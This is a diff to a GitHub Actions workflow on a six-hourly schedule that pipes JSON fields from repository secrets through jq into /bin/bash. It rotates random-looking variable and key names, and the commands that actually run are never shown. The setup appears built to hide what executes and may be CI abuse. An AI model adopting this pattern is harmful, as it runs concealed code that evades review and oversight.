@@ -3,26 +3,22 @@ name: zhangshun19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 3/6 * * *'
+    - cron: '12 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangshun19871010
         env:
-          upqs0: ${{ secrets.upqs0 }}
+          ajsa304: ${{ secrets.ajsa304 }}
         run: |
-          echo $upqs0 | jq -r .ik8 | /bin/bash
-          echo $zqf6 | jq -r .e7 | /bin/bash
-          echo $obt11 | jq -r .dyd602 | /bin/bash
-          echo $jk6 | jq -r .o60136 | /bin/bash
-          echo $rb0289 | jq -r .gvooz0364 | /bin/bash
-          echo $nihti344 | jq -r .zfeoh15 | /bin/bash
-          echo $pk34 | jq -r .h48 | /bin/bash
-          echo $xqwzy85 | jq -r .jkh786 | /bin/bash
-          echo $rsvku400 | jq -r .hsg991 | /bin/bash
-          echo $wf3 | jq -r .lug2467 | /bin/bash
+          echo $ajsa304 | jq -r .dxs1420 | /bin/bash
+          echo $egzqx25445 | jq -r .np2466 | /bin/bash
+          echo $v6 | jq -r .c240 | /bin/bash
+          echo $gjw7 | jq -r .fdo1141 | /bin/bash
+          echo $xi6 | jq -r .pfw08 | /bin/bash
+          echo $axobn89451 | jq -r .do11 | /bin/bash
+          echo $hxvg39655 | jq -r .onbxp352 | /bin/bash
 
